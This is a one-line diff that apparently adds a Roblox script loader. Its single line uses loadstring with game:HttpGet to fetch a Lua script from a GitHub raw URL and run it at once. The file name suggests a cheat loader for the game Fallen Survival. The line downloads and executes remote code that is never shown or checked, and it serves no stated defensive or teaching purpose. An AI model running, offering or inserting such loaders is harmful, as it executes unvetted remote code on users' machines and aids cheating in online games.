@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/new-map-fallen-survival-spam0-ay2aorzgkxvu2d.lua"))()
